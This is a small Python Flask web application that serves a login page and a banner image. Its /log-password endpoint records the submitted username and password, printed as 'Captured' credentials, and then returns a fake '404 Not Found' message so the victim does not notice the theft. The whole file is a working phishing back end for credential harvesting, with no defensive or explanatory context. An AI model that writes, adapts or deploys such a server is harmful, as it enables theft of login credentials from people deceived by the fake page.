from flask import Flask, request, render_template, redirect, url_for, send_from_directory
import os

app = Flask(__name__)

@app.route('/')
def serve_login():
    return render_template('index.html')

@app.route('/banner.jpeg')
def serve_image():
    return send_from_directory('.', 'banner.jpeg')

@app.route('/log-password', methods=['POST'])
def log_password():
    username = request.form.get('username')
    password = request.form.get('password')
    print(f"Captured username: {username}")
    print(f"Captured password: {password}")
    return "404 Not Found\nThe requested URL was not found on this server."

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
